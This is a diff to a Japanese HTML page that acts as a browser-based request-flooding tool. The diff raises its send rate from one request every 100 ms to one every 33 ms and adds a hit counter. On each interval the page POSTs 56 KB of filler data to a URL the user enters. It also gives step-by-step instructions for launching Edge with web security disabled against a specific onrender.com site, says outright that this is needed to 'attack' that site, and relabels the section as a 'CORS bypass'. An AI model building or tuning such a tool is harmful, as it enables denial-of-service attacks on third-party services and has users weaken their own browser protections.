@@ -23,6 +23,12 @@
             border-radius: 5px;
             overflow-x: auto; /* 横スクロール */
         }
+        /* カウンター表示用のスタイルを追加 */
+        #counterDisplay {
+            margin-top: 10px;
+            font-size: 1.2em;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
@@ -33,20 +39,30 @@
     <button id="startTest">発射</button>
     <button id="stopTest" disabled>停止</button>
     
+    <!-- ここにカウンター表示を追加 -->
+    <p id="counterDisplay">訪問回数: <span id="requestCount">0</span> 回</p>
+    
     <div id="results"></div>
     
-    <p>確実にそのサイトに攻撃する方法</p>
+    <p>CORS回避方法</p>
     <p>1. Windows(のマーク)キー+Rキーを同時押しする。</p>
     <p>2. cmdと入力して検索する。</p>
     <p>3. コマンドプロンプトが開く。下記のコードをコピペして実行する。</p>
+
     
     <pre id="commandText">
-"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp https://tyoutasirohoukai.onrender.com/
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-web-security --user-data-dir=C:\Windows\Temp tyoutasirohou.onrender.com/
 
     </pre>
+       <p>これをしないと、そのサイトに攻撃ができません</p>
     <script>
         let intervalId;
         let isRunning = false;
+
+        // --- 追加・修正部分 ---
+        // リクエスト回数を保存する変数
+        let requestCount = 0; 
+        // --- ここまで ---
 
         document.getElementById('startTest').addEventListener('click', function() {
             const url = document.getElementById('url').value;
@@ -58,6 +74,12 @@
                 return;
             }
 
+            // --- 追加・修正部分 ---
+            // カウンターをリセット
+            requestCount = 0;
+            document.getElementById('requestCount').textContent = requestCount;
+            // --- ここまで ---
+
             const sendData = new Array(56000).fill('A').join(''); // 56000バイトのデータを作成
             isRunning = true;
 
@@ -66,6 +88,12 @@
 
             // 定期的にリクエストを送信
             intervalId = setInterval(() => {
+                // --- 追加・修正部分 ---
+                // リクエストを送信する前にカウンターを増やす
+                requestCount++;
+                document.getElementById('requestCount').textContent = requestCount;
+                // --- ここまで ---
+
                 fetch(url, {
                     method: 'POST',
                     headers: {
@@ -81,7 +109,7 @@
                 .catch(err => {
                     console.error('Error:', err);
                 });
-            }, 100); // 100ミリ秒ごとにリクエストを送信
+            }, 33); // --- ここを修正 --- 100ミリ秒から33ミリ秒に変更
         });
 
         document.getElementById('stopTest').addEventListener('click', function() {
